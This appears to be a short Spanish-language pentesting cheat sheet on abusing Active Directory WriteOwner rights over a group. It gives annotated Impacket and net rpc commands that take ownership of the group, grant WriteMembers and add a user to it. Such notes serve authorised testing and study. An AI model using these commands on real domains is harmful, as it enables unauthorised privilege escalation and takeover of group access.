# Abuso ACL 

Tags: #AD #ACL #Linux #Impacket 

## WriteOwner sobre Grupo 

```bash 
# Cambiar la propiedad del objeto 
❯ impacket-owneredit -action write -new-owner 'attacker' -target 'victim' 'Domain'/'ControlledUser':'password'

	# attacker = Usuario al que vas a asignar como nuevo propietario del objeto
	# target = Grupo, usuario, equipo victima sobre el que se tienen los derechos 
	# ControlledUser & password = Credenciales del usuario que tiene los derechos de 'WriteOwner'
```

```bash 
# Modificar los permisos y abusar de la propiedad de un objeto de grupo, se puede conceder a uno mismo el permiso 'AddMember'

❯ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'ControlledUser' -target-dn 'groupDistinguidedName' 'domain'/'ControlledUser':'password'

	# ControlledUser = Usuario al que se le va a asignar el permiso dentro del ACL del objeto destino
	# target-dn = Es el 'Distinguished Name' del grupo victima (CN=Management,CN=Users,DC=Domain,DC=Corp)
	# ControlledUser & password = Credenciales del usuario que tiene los derechos de 'WriteOwner'

Notas:
	1. BloodHound muestra el 'Distinguished Name' dandole click al grupo 
```

```bash 
# Agregar miembros al grupo
❯ net rpc group addmem "TargetGroup" "TargetUser" -U "domain"/"ControlledUser"%"password" -S "DomainController"

	# TargetGroup = Grupo victima sobre el que se tienen los derechos
	# TargetUser = Usuario a añadir 
	# ControlledUser & password = Credenciales del usuario que tiene los derechos de 'WriteOwner'
	# DomainController = Es la dirección IP 
```